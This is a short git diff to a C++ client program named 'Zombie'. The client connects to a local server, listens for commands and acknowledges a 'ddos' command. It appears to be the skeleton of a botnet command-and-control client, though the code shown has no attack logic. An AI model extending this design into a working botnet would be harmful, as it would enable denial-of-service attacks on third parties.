@@ -1,4 +1,3 @@
-#include <iostream>
 #include <thread>
 
 #include "Client.h"
@@ -32,7 +31,7 @@ int main()
 
 	if (Zombie.createSocket())
 	{
-		if (Zombie.connectToSrv("127.0.0.1", 54001))
+		if (Zombie.connectToSrv("127.0.0.1", 54002))
 		{
 			std::cout << "connected" << std::endl;
 			std::thread worker(waitingForServerMsg, std::ref(Zombie));
@@ -42,9 +41,9 @@ int main()
 				{
 					std::cout << rcvMsg << std::endl;
 					if (rcvMsg == "ddos")
-						Zombie.sendToSrv("Started Ddos");
+						Zombie.sendToSrv("Started Ddos", strlen("Started Ddos"));
 					else
-						Zombie.sendToSrv(rcvMsg);
+						Zombie.sendToSrv(rcvMsg.c_str(), rcvMsg.size());
 					rcvMsg.clear();
 				}
 			}
@@ -60,6 +59,5 @@ int main()
 		std::cout << "Couldnt create Socket" << std::endl;
 	}
 	
-	std::cin.get();
 	return 0;
 }
